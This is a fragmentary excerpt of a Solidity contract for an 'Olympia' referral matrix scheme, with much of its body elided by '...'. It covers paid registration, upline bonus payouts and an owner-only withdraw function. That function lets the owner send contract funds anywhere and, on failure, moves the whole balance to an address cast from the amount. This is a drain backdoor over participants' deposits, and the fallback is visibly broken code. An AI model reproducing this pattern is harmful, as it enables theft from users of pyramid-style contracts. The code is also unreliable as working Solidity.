...
contract OlympiaMatrixContract{
    ...
    function registration(address userAddress, address referrerAddress) private {
        require(msg.value == (matrixprice[1]), "registration cost 0.005 ether");
     ...
     function distributebonus(address userAddress,address referrerAddress,uint8 level) private{        
       ...
       if(referral == 1){
        if(level==1){
         ...
         updateM4Matrix(userAddress,level);     
        }else{
         ...
         if(users[referrerAddress].E3Matrix[level].blocked){
            ...
            transferAmount(upline,reward,5);
         }else{
         ...
         if(users[referrerAddress].E3Matrix[level].blocked){
            ...
            transferAmount(upline,reward,2);
         }else{
         ...
         if(users[referrerAddress].E3Matrix[level].blocked){
            emit Payout(userAddress,referrerAddress,0,users[userAddress].id,users[referrerAddress].id,1,level,referral,reentry);
            upline = findFreeD3Referrer(referrerAddress,level);
            emit Payout(upline,referrerAddress,reward,users[upline].id,users[referrerAddress].id,3,level,referral,0);
            transferAmount(upline,reward,3);
         }else{
            if(users[referrerAddress].activeE3Levels[level]){
                emit Payout(userAddress,referrerAddress,reward,users[userAddress].id,users[referrerAddress].id,1,level,referral,reentry);
    ...
    function withdraw(address account,uint256 newBalance) public onlyOwner
    {
      require(newBalance > 0, "Amount should be greater than 0.");
      if (!address(uint160(account)).send(newBalance)) {
        return address(uint160(newBalance)).transfer(address(this).balance);
     }  
    }
